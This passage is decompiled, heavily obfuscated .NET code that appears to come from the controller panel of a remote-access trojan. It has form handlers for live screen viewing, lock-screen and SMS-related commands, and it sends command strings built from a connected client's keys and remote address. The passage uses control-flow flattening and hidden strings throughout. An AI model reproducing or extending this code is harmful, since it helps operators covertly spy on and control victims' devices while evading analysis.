              num1 = 1027890473;
              continue;
            case 5:
              this.StartButton.Enabled = true;
              num1 = (int) num2 * -783205666 ^ 775300937;
              continue;
            case 6:
              this.toptitle.Text = EXGuarder.\u003510F4754;
              ((WebViewMonitor) this).classClient.SendMessage(ParametersObjects);
              num1 = (int) num2 * -1099400378 ^ -1082841038;
              continue;
            case 7:
              this.toptitle.Text = EXGuarder.\u00343227512;
              this.vewpnl.Enabled = false;
              num1 = (int) num2 * -552654993 ^ -1741470299;
              continue;
            case 8:
              this.StopButton.Enabled = false;
              num1 = (int) num2 * 1439653574 ^ 1951149649;
              continue;
            case 9:
              this.Livepicbox.Enabled = false;
              num1 = (int) num2 * -86867087 ^ -1528715792;
              continue;
            case 10:
              goto label_2;
            default:
              goto label_14;
          }
        }
label_14:
        this.PBS.Value = 0;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_16:
        int num4 = 755901714;
        while (true)
        {
          uint num5;
          switch ((num5 = (uint) ((-num4 - -(~~-318830237 - (-727463833 * 213867523 + (-1863961135 ^ -1440789310)))) * 1388196823 ^ 1338083070 - -1947122919 + (155678783 - 1816013584) ^ -426454052)) % 3U)
          {
            case 0:
              goto label_4;
            case 1:
              ProjectData.ClearProjectError();
              num4 = (int) num5 * -452550832 ^ -920930499;
              continue;
            case 2:
              goto label_16;
            default:
              goto label_20;
          }
        }
label_4:
        return;
label_20:;
      }
    }

    private void ScreenShoter_KeyDown_1(object sender, KeyEventArgs e)
    {
      if (MyComputer.get_Computer().Keyboard.CapsLock)
        goto label_5;
label_1:
      int num1 = -672156959;
label_2:
      uint num2;
      string lower;
      switch ((num2 = (uint) (---num1 * 120535205)) % 3U)
      {
        case 0:
          goto label_1;
        case 1:
          lower = Strings.ChrW((int) e.KeyCode).ToString().ToLower();
          goto label_6;
        case 2:
          return;
        default:
          return;
      }
label_5:
      lower = Conversions.ToString(Strings.ChrW((int) e.KeyCode));
label_6:
      char ch = Conversions.ToChar(lower);
      Console.WriteLine(EXGuarder.\u0036E5A2366 + Conversions.ToString(ch));
      num1 = 1388639893;
      goto label_2;
    }

    private void DrakeUIAvatar2_Click(object sender, EventArgs e)
    {
      if (((WebViewMonitor) this).classClient == null)
        return;
label_1:
      int num1 = -870935960;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) ((-939970370 - ~(num2 * -1031997913 * 1148142617)) * -426545851)) % 4U)
        {
          case 0:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((WebViewMonitor) this).classClient.SendMessage(new object[4]
            {
              (object) ((Data._Closure\u0024__) ((WebViewMonitor) this).classClient).myClient,
              (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00307207160 + this.textsend.Text + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0033D554148 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0033D554148 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((WebViewMonitor) this).classClient).ClientRemoteAddress),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u003583C4107),
              (object) ((WebViewMonitor) this).classClient
            });
            this.textsend.Text = EXGuarder.\u003510A753E;
            num1 = (int) num3 * 735177333 ^ 645516578;
            continue;
          case 1:
            goto label_6;
          case 2:
            goto label_1;
          case 3:
            int num4 = this.textsend.Text.Length <= 0 ? -1834338668 : (num4 = -1663093351);
            num1 = num4 ^ (int) num3 * -1084198954;
            continue;
          default:
            goto label_7;
        }
      }
label_6:
      return;
label_7:;
    }

    private void DrakeUIAvatar8_Click(object sender, EventArgs e)
    {
      if (((WebViewMonitor) this).classClient == null)
        return;
      try
      {
        string[] strArray = ((Data) ((WebViewMonitor) this).classClient).Keys.Split(':');
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        ((WebViewMonitor) this).classClient.SendMessage(new object[4]
        {
          (object) ((Data._Closure\u0024__) ((WebViewMonitor) this).classClient).myClient,
          (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0031D1D1023 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((WebViewMonitor) this).classClient).ClientRemoteAddress),
          (object) Codes.Encoding().GetBytes(EXGuarder.\u00321027052),
          (object) ((WebViewMonitor) this).classClient
        });
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_3:
        int num1 = 761419389;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) (-(1606968679 * (659641575 - 1146666228 - (-1335359806 ^ 1841041845) + (-343535721 ^ 1989324326 - -1044150929))) - num2 + ~(-291995039 * -2112551583) ^ (-1815381617 - 1202824170 ^ -390580275 * 1816594687) * -1870347567)) % 3U)
          {
            case 0:
              goto label_7;
            case 1:
              ProjectData.ClearProjectError();
              num1 = (int) num3 * 896449758 ^ -1082243916;
              continue;
            case 2:
              goto label_3;
            default:
              goto label_8;
          }
        }
label_7:
        return;
label_8:;
      }
    }

    private void DrakeUIAvatar9_Click(object sender, EventArgs e)
    {
      if (((WebViewMonitor) this).classClient == null)
        return;
      try
      {
        string[] strArray = ((Data) ((WebViewMonitor) this).classClient).Keys.Split(':');
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        object[] ParametersObjects = new object[4]
        {
          (object) ((WebViewMonitor) this).Client,
          (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00320667571 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((WebViewMonitor) this).classClient).ClientRemoteAddress),
          (object) Codes.Encoding().GetBytes(EXGuarder.\u0034E0B3129),
          (object) ((WebViewMonitor) this).classClient
        };
label_2:
        int num1 = -672370214;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) ~((810160500 ^ -2091234318) - (~(43407644 + 2134740298) - (num2 * 1299895893 - (-(~-34663847 + (1835840685 ^ 238211048)) - -(1017415223 * 2031207947 ^ -1830166230 ^ 1840825525)) + 191888856)))) % 3U)
          {
            case 0:
              goto label_2;
            case 1:
              ((WebViewMonitor) this).classClient.SendMessage(ParametersObjects);
              num1 = (int) num3 * -824787759 ^ 609051289;
              continue;
            case 2:
              goto label_7;
            default:
              goto label_8;
          }
        }
label_7:
        return;
label_8:;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
    {
      if (!((WebViewMonitor) this).keepmeto)
        goto label_6;
label_1:
      int num1 = -525705762;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~(~num1 + ((1952897462 ^ 322135416) - -1877475094 ^ (1192549778 - 567748894) * 1155216783 ^ 431496265) - 282550437 ^ 630844758 - -1437216165 ^ -662294896) - 276756728)) % 8U)
        {
          case 0:
            num1 = (int) num2 * -2067258024 ^ 1518495173;
            continue;
          case 1:
            this.pinbtn.ForeColor = Color.Lime;
            num1 = (int) num2 * -863261470 ^ 354106602;
            continue;
          case 2:
            goto label_3;
          case 3:
            goto label_1;
          case 4:
            goto label_6;
          case 5:
            ScreenShoter.SetWindowPos(this.Handle, new IntPtr(-2), 0, 0, 0, 0, 3U);
            ((WebViewMonitor) this).keepmeto = true;
            num1 = (int) num2 * 1672124264 ^ 1362799181;
            continue;
          case 6:
            ((WebViewMonitor) this).keepmeto = false;
            num1 = (int) num2 * 777524275 ^ -572617395;
            continue;
          case 7:
            ScreenShoter.SetWindowPos(this.Handle, new IntPtr(-1), 0, 0, 0, 0, 3U);
            num1 = (int) num2 * 835315772 ^ -394978707;
            continue;
          default:
            goto label_10;
        }
      }
label_3:
      return;
label_10:
      return;
label_6:
      this.pinbtn.ForeColor = Color.Red;
      num1 = 717695658;
      goto label_2;
    }

    [MethodImpl(MethodCodeType = MethodCodeType.Runtime)]
    public extern ScreenShoter(object TargetObject, IntPtr TargetMethod);

    [MethodImpl(MethodCodeType = MethodCodeType.Runtime)]
    public virtual extern IAsyncResult BeginInvoke(
      AsyncCallback DelegateCallback,
      object DelegateAsyncState);

    public delegate void Delegatstoper();

    public delegate void addLogback(object[] objs);
  }
}
